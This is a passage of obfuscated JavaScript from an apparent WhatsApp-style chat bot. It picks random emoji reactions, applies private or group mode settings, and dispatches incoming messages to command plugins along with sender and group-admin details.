'\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83d\udc12', '\ud83e\udd8d', '\ud83e\udda7', '\ud83d\udc36', '\ud83d\udc15', '\ud83e\uddae', '\ud83d\udc15\u200d\ud83e\uddba', '\ud83d\udc29', '\ud83d\udc3a', '\ud83e\udd8a', '\ud83e\udd9d', '\ud83d\udc31', '\ud83d\udc08', '\ud83d\udc08\u200d\u2b1b', '\ud83e\udd81', '\ud83d\udc2f', '\ud83d\udc05', '\ud83d\udc06', '\ud83d\udc34', '\ud83d\udc0e', '\ud83e\udd84', '\ud83e\udd93', '\ud83e\udd8c', '\ud83e\uddac', '\ud83d\udc2e', '\ud83d\udc02', '\ud83d\udc03', '\ud83d\udc04', '\ud83d\udc37', '\ud83d\udc16', '\ud83d\udc17', '\ud83d\udc3d', '\ud83d\udc0f', '\ud83d\udc11', '\ud83d\udc10', '\ud83d\udc2a', '\ud83d\udc2b', '\ud83e\udd99', '\ud83e\udd92', '\ud83d\udc18', '\ud83e\udda3', '\ud83e\udd8f', '\ud83e\udd9b', '\ud83d\udc2d', '\ud83d\udc01', '\ud83d\udc00', '\ud83d\udc39', '\ud83d\udc30', '\ud83d\udc07', _0x1ed978('\x30\x78\x31\x38\x37'), '\ud83e\uddab', '\ud83e\udd94', '\ud83e\udd87', '\ud83d\udc3b', '\ud83d\udc3b\u200d\u2744\ufe0f', '\ud83d\udc28', '\ud83d\udc3c', '\ud83e\udda5', '\ud83e\udda6', '\ud83e\udda8', '\ud83e\udd98', '\ud83e\udda1', '\ud83d\udc3e', '\ud83e\udd83', '\ud83d\udc14', '\ud83d\udc13', '\ud83d\udc23', '\ud83d\udc24', '\ud83d\udc25', '\ud83d\udc26', '\ud83d\udc27', _0x1ed978('\x30\x78\x31\x61\x64'), '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udda2', '\ud83e\udd89', '\ud83e\udda4', '\ud83e\udeb6', '\ud83e\udda9', '\ud83e\udd9a', '\ud83e\udd9c', '\ud83d\udc38', '\ud83d\udc0a', '\ud83d\udc22', '\ud83e\udd8e', '\ud83d\udc0d', '\ud83d\udc32', '\ud83d\udc09', '\ud83e\udd95', '\ud83e\udd96', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc2c', '\ud83e\uddad', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\ude00', '\ud83d\ude03', '\ud83d\ude04', '\ud83d\ude01', '\ud83d\ude06', '\ud83d\ude05', '\ud83e\udd23', '\ud83d\ude02', '\ud83d\ude42', '\ud83d\ude43', '\ud83d\ude09', '\ud83d\ude0a', '\ud83d\ude07', '\ud83e\udd70', '\ud83d\ude0d', '\ud83e\udd29', '\ud83d\ude18', '\ud83d\ude17', '\u263a\ufe0f', '\ud83d\ude1a', '\ud83d\ude19', '\ud83e\udd72', '\ud83d\ude0b', '\ud83d\ude1b', '\ud83d\ude1c', '\ud83e\udd2a', '\ud83d\ude1d', '\ud83e\udd11', '\ud83e\udd17', '\ud83e\udd2d', '\ud83e\udd2b', '\ud83e\udd14', '\ud83e\udd10', '\ud83e\udd28', '\ud83d\ude10', '\ud83d\ude11', '\ud83d\ude36', '\ud83d\ude36\u200d\ud83c\udf2b\ufe0f', '\ud83d\ude0f', '\ud83d\ude12', '\ud83d\ude44', '\ud83d\ude2c', _0x1ed978('\x30\x78\x31\x65\x30'), '\ud83e\udd25', '\ud83d\ude0c', '\ud83d\ude14', '\ud83d\ude2a', '\ud83e\udd24', '\ud83d\ude34', '\ud83d\ude37', '\ud83e\udd12', '\ud83e\udd15', '\ud83e\udd22', '\ud83e\udd2e', '\ud83e\udd27', '\ud83e\udd75', '\ud83e\udd76', '\ud83e\udd74', '\ud83d\ude35', _0x1ed978('\x30\x78\x31\x62\x31'), '\ud83e\udd2f', '\ud83e\udd20', '\ud83e\udd73', '\ud83e\udd78', '\ud83d\ude0e', '\ud83e\udd13', '\ud83e\uddd0', '\ud83d\ude15', '\ud83d\ude1f', '\ud83d\ude41', '\u2639\ufe0f', '\ud83d\ude2e', '\ud83d\ude2f', '\ud83d\ude32', '\ud83d\ude33', '\ud83e\udd7a', '\ud83d\ude26', '\ud83d\ude27', '\ud83d\ude28', '\ud83d\ude30', '\ud83d\ude25', '\ud83d\ude22', '\ud83d\ude2d', '\ud83d\ude31', '\ud83d\ude16', '\ud83d\ude23', '\ud83d\ude1e', '\ud83d\ude13', '\ud83d\ude29', '\ud83d\ude2b', '\ud83e\udd71', '\ud83d\ude24', '\ud83d\ude21', '\ud83d\ude20', '\ud83e\udd2c', '\ud83d\ude08', '\ud83d\udc7f', '\ud83d\udc80', '\u2620\ufe0f', '\ud83d\udca9', '\ud83e\udd21', '\ud83d\udc79', '\ud83d\udc7a', '\ud83d\udc7b', '\ud83d\udc7d', '\ud83d\udc7e', '\ud83e\udd16', '\ud83d\ude3a', '\ud83d\ude38', '\ud83d\ude39', '\ud83d\ude3b', '\ud83d\ude3c', '\ud83d\ude3d', '\ud83d\ude40', '\ud83d\ude3f', '\ud83d\ude3e', '\ud83d\ude48', '\ud83d\ude49', '\ud83d\ude4a', '\ud83d\udc8b', '\ud83d\udc8c', '\ud83d\udc98', '\ud83d\udc9d', '\ud83d\udc96', '\ud83d\udc97', '\ud83d\udc93', '\ud83d\udc9e', '\ud83d\udc95', '\ud83d\udc9f', '\u2763\ufe0f', '\ud83d\udc94', _0x1ed978(0x1fa), _0x1ed978(0x24e), '\u2764\ufe0f', '\ud83e\udde1', '\ud83d\udc9b', '\ud83d\udc9a', '\ud83d\udc99', '\ud83d\udc9c', '\ud83e\udd0e', '\ud83d\udda4', '\ud83e\udd0d', '\ud83d\udcaf', '\ud83d\udca2', '\ud83d\udca5', '\ud83d\udcab', '\ud83d\udca6', '\ud83d\udca8', '\ud83d\udd73\ufe0f', '\ud83d\udca3', '\ud83d\udcac', '\ud83d\udc41\ufe0f\u200d\ud83d\udde8\ufe0f', _0x1ed978('\x30\x78\x65\x37'), '\ud83d\uddef\ufe0f', '\ud83d\udcad', '\ud83d\udca4', '\ud83d\udc4b', '\ud83e\udd1a', '\ud83d\udd90\ufe0f', '\u270b', '\ud83d\udd96', '\ud83d\udc4c', '\ud83e\udd0c', '\ud83e\udd0f', '\u270c\ufe0f', '\ud83e\udd1e', '\ud83e\udd1f', '\ud83e\udd18', '\ud83e\udd19', '\ud83d\udc48', '\ud83d\udc49', '\ud83d\udc46', '\ud83d\udd95', '\ud83d\udc47', '\u261d\ufe0f', '\ud83d\udc4d', '\ud83d\udc4e', '\u270a', '\ud83d\udc4a', '\ud83e\udd1b', '\ud83e\udd1c', '\ud83d\udc4f', '\ud83d\ude4c', '\ud83d\udc50', '\ud83e\udd32', '\ud83e\udd1d', '\ud83d\ude4f', '\u270d\ufe0f', '\ud83d\udc85', '\ud83e\udd33', '\ud83d\udcaa', '\ud83e\uddbe', '\ud83e\uddbf', '\ud83e\uddb5', '\ud83e\uddb6', '\ud83d\udc42', '\ud83e\uddbb', '\ud83d\udc43', '\ud83e\udde0', '\ud83e\udec0', '\ud83e\udec1', '\ud83e\uddb7', '\ud83e\uddb4', '\ud83d\udc40', _0x1ed978(0x1ba), '\ud83d\udc45', '\ud83d\udc44', '\ud83d\udc76', '\ud83e\uddd2', '\ud83d\udc66', '\ud83d\udc67', '\ud83e\uddd1', '\ud83d\udc71', '\ud83d\udc68', '\ud83e\uddd4', _0x1ed978(0x131), '\ud83e\uddd4\u200d\u2640\ufe0f', '\ud83d\udc68\u200d\ud83e\uddb0', _0x1ed978('\x30\x78\x66\x61'), _0x1ed978(0x209), _0x1ed978('\x30\x78\x32\x30\x32'), '\ud83d\udc69', '\ud83d\udc69\u200d\ud83e\uddb0', _0x1ed978(0x101), '\ud83d\udc69\u200d\ud83e\uddb1', _0x1ed978(0xeb), _0x1ed978('\x30\x78\x31\x61\x35'), _0x1ed978(0xe4), _0x1ed978('\x30\x78\x31\x31\x34'), _0x1ed978(0x1dd), _0x1ed978(0x1bc), _0x1ed978('\x30\x78\x31\x65\x63'), '\ud83e\uddd3', '\ud83d\udc74', '\ud83d\udc75', '\ud83d\ude4d', _0x1ed978('\x30\x78\x65\x32'), _0x1ed978('\x30\x78\x32\x32\x62'), '\ud83d\ude4e', '\ud83d\ude4e\u200d\u2642\ufe0f', _0x1ed978(0x240), '\ud83d\ude45', _0x1ed978(0x295), _0x1ed978(0x13d), '\ud83d\ude46', '\ud83d\ude46\u200d\u2642\ufe0f', _0x1ed978(0x273), '\ud83d\udc81', _0x1ed978(0x297), '\ud83d\udc81\u200d\u2640\ufe0f', '\ud83d\ude4b', '\ud83d\ude4b\u200d\u2642\ufe0f', _0x1ed978(0x14b), '\ud83e\uddcf', _0x1ed978(0x1a2), _0x1ed978('\x30\x78\x31\x65\x65'), '\ud83d\ude47', _0x1ed978(0xed), '\ud83d\ude47\u200d\u2640\ufe0f', '\ud83e\udd26', _0x1ed978(0x190), _0x1ed978('\x30\x78\x31\x63\x65'), '\ud83e\udd37', '\ud83e\udd37\u200d\u2642\ufe0f', _0x1ed978(0x1f0), _0x1ed978('\x30\x78\x31\x63\x63'), _0x1ed978('\x30\x78\x32\x39\x39'), _0x1ed978(0x12f), '\ud83e\uddd1\u200d\ud83c\udf93', _0x1ed978(0x136), _0x1ed978('\x30\x78\x32\x37\x64'), _0x1ed978('\x30\x78\x32\x30\x36'), _0x1ed978('\x30\x78\x31\x35\x37'), _0x1ed978('\x30\x78\x32\x35\x33'), _0x1ed978(0x12c), _0x1ed978('\x30\x78\x31\x31\x37'), '\ud83d\udc69\u200d\u2696\ufe0f', _0x1ed978('\x30\x78\x31\x37\x33'), _0x1ed978('\x30\x78\x32\x34\x33'), '\ud83d\udc69\u200d\ud83c\udf3e', _0x1ed978('\x30\x78\x32\x37\x39'), _0x1ed978(0x1b9), '\ud83d\udc69\u200d\ud83c\udf73', _0x1ed978(0x18d), _0x1ed978(0x17e), _0x1ed978(0x213), '\ud83e\uddd1\u200d\ud83c\udfed', '\ud83d\udc68\u200d\ud83c\udfed', _0x1ed978(0x1c9), _0x1ed978(0x1e5), _0x1ed978('\x30\x78\x31\x32\x36'), _0x1ed978(0x1e1), _0x1ed978('\x30\x78\x31\x34\x64'), _0x1ed978('\x30\x78\x31\x38\x30'), '\ud83d\udc69\u200d\ud83d\udd2c', _0x1ed978(0xfe), _0x1ed978('\x30\x78\x31\x31\x36'), _0x1ed978(0x284), _0x1ed978(0x152), _0x1ed978(0x250), _0x1ed978(0x145), _0x1ed978(0x163), _0x1ed978(0x14a), '\ud83d\udc69\u200d\ud83c\udfa8', '\ud83e\uddd1\u200d\u2708\ufe0f', '\ud83d\udc68\u200d\u2708\ufe0f', '\ud83d\udc69\u200d\u2708\ufe0f', '\ud83e\uddd1\u200d\ud83d\ude80', _0x1ed978(0xe8), _0x1ed978('\x30\x78\x31\x30\x39'), '\ud83e\uddd1\u200d\ud83d\ude92', '\ud83d\udc68\u200d\ud83d\ude92', '\ud83d\udc69\u200d\ud83d\ude92', '\ud83d\udc6e', _0x1ed978('\x30\x78\x32\x35\x38'), _0x1ed978(0x200), '\ud83d\udd75\ufe0f', _0x1ed978(0x154), '\ud83d\udd75\ufe0f\u200d\u2640\ufe0f', '\ud83d\udc82', _0x1ed978(0x232), _0x1ed978(0x1d9), '\ud83e\udd77', '\ud83d\udc77', _0x1ed978('\x30\x78\x31\x61\x61'), _0x1ed978('\x30\x78\x31\x35\x39'), '\ud83e\udd34', '\ud83d\udc78', '\ud83d\udc73', _0x1ed978(0x27b), _0x1ed978('\x30\x78\x31\x66\x66'), '\ud83d\udc72', '\ud83e\uddd5', '\ud83e\udd35', _0x1ed978(0x262), _0x1ed978(0x1dc), '\ud83d\udc70', _0x1ed978(0x24b), _0x1ed978('\x30\x78\x31\x63\x33'), '\ud83e\udd30', '\ud83e\udd31', _0x1ed978(0x19b), _0x1ed978('\x30\x78\x32\x37\x66'), '\ud83e\uddd1\u200d\ud83c\udf7c', '\ud83d\udc7c', '\ud83c\udf85', '\ud83e\udd36', _0x1ed978(0x1b4), '\ud83e\uddb8', _0x1ed978(0x1c7), _0x1ed978(0x102), '\ud83e\uddb9', '\ud83e\uddb9\u200d\u2642\ufe0f', _0x1ed978(0x235), '\ud83e\uddd9', _0x1ed978('\x30\x78\x31\x61\x31'), _0x1ed978(0x1f4), '\ud83e\uddda', _0x1ed978('\x30\x78\x32\x35\x66'), _0x1ed978(0x1e2), '\ud83e\udddb', '\ud83e\udddb\u200d\u2642\ufe0f', _0x1ed978(0x178), '\ud83e\udddc', _0x1ed978('\x30\x78\x32\x38\x62'), _0x1ed978(0x132), '\ud83e\udddd', _0x1ed978('\x30\x78\x32\x39\x63'), _0x1ed978('\x30\x78\x31\x66\x32'), '\ud83e\uddde', '\ud83e\uddde\u200d\u2642\ufe0f', '\ud83e\uddde\u200d\u2640\ufe0f', '\ud83e\udddf', _0x1ed978(0x123), '\ud83e\udddf\u200d\u2640\ufe0f', '\ud83d\udc86', _0x1ed978(0x10e), '\ud83d\udc86\u200d\u2640\ufe0f', '\ud83d\udc87', '\ud83d\udc87\u200d\u2642\ufe0f', _0x1ed978(0x25e), '\ud83d\udeb6', _0x1ed978('\x30\x78\x31\x33\x30'), _0x1ed978(0x14f), '\ud83e\uddcd', '\ud83e\uddcd\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x31\x62'), '\ud83e\uddce', _0x1ed978('\x30\x78\x32\x32\x61'), _0x1ed978(0xe5), _0x1ed978(0xf2), _0x1ed978(0x13a), _0x1ed978('\x30\x78\x31\x36\x39'), _0x1ed978(0x1e6), '\ud83d\udc68\u200d\ud83e\uddbc', _0x1ed978(0x234), '\ud83e\uddd1\u200d\ud83e\uddbd', _0x1ed978(0x237), _0x1ed978('\x30\x78\x32\x36\x33'), '\ud83c\udfc3', '\ud83c\udfc3\u200d\u2642\ufe0f', _0x1ed978(0x1fe), '\ud83d\udc83', '\ud83d\udd7a', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udc6f', '\ud83d\udc6f\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x32\x37\x37'), '\ud83e\uddd6', _0x1ed978('\x30\x78\x32\x33\x66'), _0x1ed978('\x30\x78\x31\x39\x64'), '\ud83e\uddd7', _0x1ed978('\x30\x78\x32\x37\x35'), _0x1ed978('\x30\x78\x32\x30\x62'), '\ud83e\udd3a', '\ud83c\udfc7', '\u26f7\ufe0f', '\ud83c\udfc2', _0x1ed978('\x30\x78\x66\x66'), _0x1ed978(0x276), _0x1ed978(0x296), '\ud83c\udfc4', '\ud83c\udfc4\u200d\u2642\ufe0f', '\ud83c\udfc4\u200d\u2640\ufe0f', '\ud83d\udea3', _0x1ed978('\x30\x78\x32\x34\x63'), _0x1ed978('\x30\x78\x31\x39\x35'), '\ud83c\udfca', _0x1ed978(0x264), _0x1ed978('\x30\x78\x31\x37\x37'), '\u26f9\ufe0f', _0x1ed978('\x30\x78\x66\x34'), _0x1ed978('\x30\x78\x32\x37\x34'), _0x1ed978('\x30\x78\x32\x35\x62'), '\ud83c\udfcb\ufe0f\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x34\x36'), '\ud83d\udeb4', _0x1ed978('\x30\x78\x31\x62\x65'), '\ud83d\udeb4\u200d\u2640\ufe0f', '\ud83d\udeb5', '\ud83d\udeb5\u200d\u2642\ufe0f', _0x1ed978(0x21a), '\ud83e\udd38', '\ud83e\udd38\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x39\x61'), '\ud83e\udd3c', '\ud83e\udd3c\u200d\u2642\ufe0f', '\ud83e\udd3c\u200d\u2640\ufe0f', '\ud83e\udd3d', '\ud83e\udd3d\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x64\x66'), '\ud83e\udd3e', '\ud83e\udd3e\u200d\u2642\ufe0f', _0x1ed978(0x214), '\ud83e\udd39', _0x1ed978('\x30\x78\x31\x62\x30'), _0x1ed978('\x30\x78\x31\x39\x39'), '\ud83e\uddd8', '\ud83e\uddd8\u200d\u2642\ufe0f', _0x1ed978(0x242), '\ud83d\udec0', '\ud83d\udecc', _0x1ed978(0x194), '\ud83d\udc6d', '\ud83d\udc6b', '\ud83d\udc6c', '\ud83d\udc8f', '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68', _0x1ed978('\x30\x78\x31\x66\x36'), _0x1ed978(0x1c0), '\ud83d\udc91', _0x1ed978('\x30\x78\x31\x32\x30'), _0x1ed978(0x229), _0x1ed978(0x18e), '\ud83d\udc6a', _0x1ed978('\x30\x78\x32\x37\x38'), _0x1ed978(0xf8), _0x1ed978(0x191), '\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x32\x33\x38'), _0x1ed978(0x236), _0x1ed978('\x30\x78\x31\x63\x38'), '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66', '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978(0x13b), '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x32\x35\x34'), _0x1ed978(0x113), _0x1ed978(0x1d2), '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67', _0x1ed978(0x144), '\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x31\x31\x65'), '\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x32\x32\x66'), '\ud83d\udc69\u200d\ud83d\udc66', '\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978(0x197), '\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66', '\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67', _0x1ed978(0x21f), '\ud83d\udc64', '\ud83d\udc65', '\ud83e\udec2', '\ud83d\udc63', '\ud83e\uddb0', '\ud83e\uddb1', '\ud83e\uddb3', '\ud83e\uddb2', '\ud83d\udc35'],
                    _0x45d5f9 = _0x54fe6a[Math[_0x1ed978(0x1cb)](Math['\x72\x61\x6e\x64\x6f\x6d']() * _0x54fe6a[_0x1ed978(0x1c5)])];
                _0xa7df8d[_0x1ed978(0x192)](_0x45d5f9);
            }
        }
        if (!_0x457ee3 && _0x4a39ba !== _0xb16346) {
            if (config['\x43\x55\x53\x54\x4f\x4d\x5f\x52\x45\x41\x43\x54'] === '\x74\x72\x75\x65') {
                const _0x2e9696 = (config[_0x1ed978('\x30\x78\x31\x64\x37')] || _0x1ed978(0x11f))['\x73\x70\x6c\x69\x74']('\x2c'),
                    _0x33c5aa = _0x2e9696[Math[_0x1ed978(0x1cb)](Math[_0x1ed978(0x208)]() * _0x2e9696[_0x1ed978(0x1c5)])];
                _0xa7df8d[_0x1ed978('\x30\x78\x31\x39\x32')](_0x33c5aa);
            }
        }
        if (!_0x457ee3 && _0x4a39ba === _0xb16346) {
            if (config[_0x1ed978(0x1b6)] === _0x1ed978('\x30\x78\x32\x33\x63')) {
                const _0x157c11 = (config[_0x1ed978('\x30\x78\x31\x64\x37')] || '\ud83e\udd72\x2c\ud83d\ude02\x2c\ud83d\udc4d\ud83c\udffb\x2c\ud83d\ude42\x2c\ud83d\ude14')[_0x1ed978('\x30\x78\x31\x62\x64')]('\x2c'),
                    _0x4cfcdf = _0x157c11[Math[_0x1ed978(0x1cb)](Math[_0x1ed978('\x30\x78\x32\x30\x38')]() * _0x157c11[_0x1ed978('\x30\x78\x31\x63\x35')])];
                _0xa7df8d[_0x1ed978('\x30\x78\x31\x39\x32')](_0x4cfcdf);
            }
        }
        if (!_0x5bcc99 && config[_0x1ed978('\x30\x78\x31\x61\x39')] === '\x70\x72\x69\x76\x61\x74\x65') return;
        if (!_0x5bcc99 && _0x5b6d29 && config['\x4d\x4f\x44\x45'] === _0x1ed978(0x1e9)) return;
        if (!_0x5bcc99 && !_0x5b6d29 && config['\x4d\x4f\x44\x45'] === '\x67\x72\x6f\x75\x70\x73') return;
        const _0x567018 = require('\x2e\x2f\x63\x6f\x6d\x6d\x61\x6e\x64'),
            _0x791fff = _0x494d2f ? _0x14f3e6[_0x1ed978('\x30\x78\x31\x64\x35')](0x1)[_0x1ed978(0x207)]()['\x73\x70\x6c\x69\x74']('\x20')[0x0]['\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65']() : ![];
        if (_0x494d2f) {
            const _0x2d7043 = _0x567018[_0x1ed978('\x30\x78\x32\x33\x31')]['\x66\x69\x6e\x64'](_0xb2241c => _0xb2241c['\x70\x61\x74\x74\x65\x72\x6e'] === _0x791fff) || _0x567018[_0x1ed978('\x30\x78\x32\x33\x31')][_0x1ed978(0x26f)](_0x32b321 => _0x32b321['\x61\x6c\x69\x61\x73'] && _0x32b321[_0x1ed978(0x150)][_0x1ed978(0x196)](_0x791fff));
            if (_0x2d7043) {
                if (_0x2d7043[_0x1ed978('\x30\x78\x31\x39\x32')]) _0x25f52f['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_0x3f69a2, {
                    '\x72\x65\x61\x63\x74': {
                        '\x74\x65\x78\x74': _0x2d7043[_0x1ed978('\x30\x78\x31\x39\x32')],
                        '\x6b\x65\x79': _0x585fe8[_0x1ed978(0xec)]
                    }
                });
                try {
                    _0x2d7043[_0x1ed978('\x30\x78\x64\x66')](_0x25f52f, _0x585fe8, _0xa7df8d, {
                        '\x66\x72\x6f\x6d': _0x3f69a2,
                        '\x71\x75\x6f\x74\x65\x64': _0x5dc601,
                        '\x62\x6f\x64\x79': _0x14f3e6,
                        '\x69\x73\x43\x6d\x64': _0x494d2f,
                        '\x63\x6f\x6d\x6d\x61\x6e\x64': _0x2db2b2,
                        '\x61\x72\x67\x73': _0x2b2f90,
                        '\x71': _0x1398f4,
                        '\x74\x65\x78\x74': _0x37860e,
                        '\x69\x73\x47\x72\x6f\x75\x70': _0x5b6d29,
                        '\x73\x65\x6e\x64\x65\x72': _0x473af2,
                        '\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72': _0x4a39ba,
                        '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32': _0x49f3aa,
                        '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72': _0xb16346,
                        '\x70\x75\x73\x68\x6e\x61\x6d\x65': _0x157dbf,
                        '\x69\x73\x4d\x65': _0x2d722c,
                        '\x69\x73\x4f\x77\x6e\x65\x72': _0x5bcc99,
                        '\x69\x73\x43\x72\x65\x61\x74\x6f\x72': _0x162b89,
                        '\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61': _0x2940c7,
                        '\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65': _0x3a1a21,
                        '\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73': _0x471a70,
                        '\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73': _0x2817a6,
                        '\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73': _0x524b64,
                        '\x69\x73\x41\x64\x6d\x69\x6e\x73': _0x554cc9,
                        '\x72\x65\x70\x6c\x79': _0x21c5e4
                    });
                } catch (_0x53f3c5) {
                    console[_0x1ed978(0x26d)]('\x5b\x50\x4c\x55\x47\x49\x4e\x20\x45\x52\x52\x4f\x52\x5d\x20' + _0x53f3c5);
                }
            }
        }
        _0x567018[_0x1ed978('\x30\x78\x32\x33\x31')][_0x1ed978('\x30\x78\x31\x33\x38')](async _0x44933c => {
            const _0x71f2ce = _0x1ed978;
            if (_0x14f3e6 && _0x44933c['\x6f\x6e'] === _0x71f2ce('\x30\x78\x32\x31\x32')) _0x44933c[_0x71f2ce(0xdf)](_0x25f52f, _0x585fe8, _0xa7df8d, {
                '\x66\x72\x6f\x6d': _0x3f69a2,
                '\x6c': l,
                '\x71\x75\x6f\x74\x65\x64': _0x5dc601,
                '\x62\x6f\x64\x79': _0x14f3e6,
                '\x69\x73\x43\x6d\x64': _0x494d2f,
                '\x63\x6f\x6d\x6d\x61\x6e\x64': _0x44933c,
                '\x61\x72\x67\x73': _0x2b2f90,
                '\x71': _0x1398f4,
                '\x74\x65\x78\x74': _0x37860e,
                '\x69\x73\x47\x72\x6f\x75\x70': _0x5b6d29,
                '\x73\x65\x6e\x64\x65\x72': _0x473af2,
                '\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72': _0x4a39ba,
                '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32': _0x49f3aa,
                '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72': _0xb16346,
                '\x70\x75\x73\x68\x6e\x61\x6d\x65': _0x157dbf,
                '\x69\x73\x4d\x65': _0x2d722c,
                '\x69\x73\x4f\x77\x6e\x65\x72': _0x5bcc99,
                '\x69\x73\x43\x72\x65\x61\x74\x6f\x72': _0x162b89,
                '\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61': _0x2940c7,
                '\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65': _0x3a1a21,
                '\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73': _0x471a70,
                '\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73': _0x2817a6,
                '\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73': _0x524b64,
                '\x69\x73\x41\x64\x6d\x69\x6e\x73': _0x554cc9,
                '\x72\x65\x70\x6c\x79': _0x21c5e4
            });
            else {
                if (_0x585fe8['\x71'] && _0x44933c['\x6f\x6e'] === '\x74\x65\x78\x74') _0x44933c[_0x71f2ce('\x30\x78\x64\x66')](_0x25f52f, _0x585fe8, _0xa7df8d, {
                    '\x66\x72\x6f\x6d': _0x3f69a2,
                    '\x6c': l,
                    '\x71\x75\x6f\x74\x65\x64': _0x5dc601,
                    '\x62\x6f\x64\x79': _0x14f3e6,
                    '\x69\x73\x43\x6d\x64': _0x494d2f,
                    '\x63\x6f\x6d\x6d\x61\x6e\x64': _0x44933c,
                    '\x61\x72\x67\x73': _0x2b2f90,
                    '\x71': _0x1398f4,
                    '\x74\x65\x78\x74': _0x37860e,
                    '\x69\x73\x47\x72\x6f\x75\x70': _0x5b6d29,
                    '\x73\x65\x6e\x64\x65\x72': _0x473af2,
                    '\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72': _0x4a39ba,
                    '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32': _0x49f3aa,
                    '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72': _0xb16346,
                    '\x70\x75\x73\x68\x6e\x61\x6d\x65': _0x157dbf,
                    '\x69\x73\x4d\x65': _0x2d722c,
                    '\x69\x73\x4f\x77\x6e\x65\x72': _0x5bcc99,
                    '\x69\x73\x43\x72\x65\x61\x74\x6f\x72': _0x162b89,
                    '\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61': _0x2940c7,
                    '\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65': _0x3a1a21,
                    '\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73': _0x471a70,
                    '\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73': _0x2817a6,
                    '\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73': _0x524b64,
                    '\x69\x73\x41\x64\x6d\x69\x6e\x73': _0x554cc9,
                    '\x72\x65\x70\x6c\x79': _0x21c5e4
                });
                else {
                    if ((_0x44933c['\x6f\x6e'] === _0x71f2ce(0x20d) || _0x44933c['\x6f\x6e'] === _0x71f2ce(0x1d4)) && _0x585fe8[_0x71f2ce('\x30\x78\x32\x36\x65')] === _0x71f2ce('\x30\x78\x31\x62\x38')) _0x44933c[_0x71f2ce('\x30\x78\x64\x66')](_0x25f52f, _0x585fe8, _0xa7df8d, {
                        '\x66\x72\x6f\x6d': _0x3f69a2,
                        '\x6c': l,
                        '\x71\x75\x6f\x74\x65\x64': _0x5dc601,
                        '\x62\x6f\x64\x79': _0x14f3e6,
                        '\x69\x73\x43\x6d\x64': _0x494d2f,
                        '\x63\x6f\x6d\x6d\x61\x6e\x64': _0x44933c,
                        '\x61\x72\x67\x73': _0x2b2f90,
                        '\x71': _0x1398f4,
                        '\x74\x65\x78\x74': _0x37860e,
                        '\x69\x73\x47\x72\x6f\x75\x70': _0x5b6d29,
                        '\x73\x65\x6e\x64\x65\x72': _0x473af2,
                        '\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72': _0x4a39ba,
                        '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32': _0x49f3aa,
                        '\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72': _0xb16346,
                        '\x70\x75\x73\x68\x6e\x61\x6d\x65': _0x157dbf,
                        '\x69\x73\x4d\x65': _0x2d722c,
                        '\x69\x73\x4f\x77\x6e\x65\x72': _0x5bcc99,
                        '\x69\x73\x43\x72\x65\x61\x74\x6f\x72': _0x162b89,
                        '\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61': _0x2940c7,
                        '\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65': _0x3a1a21,
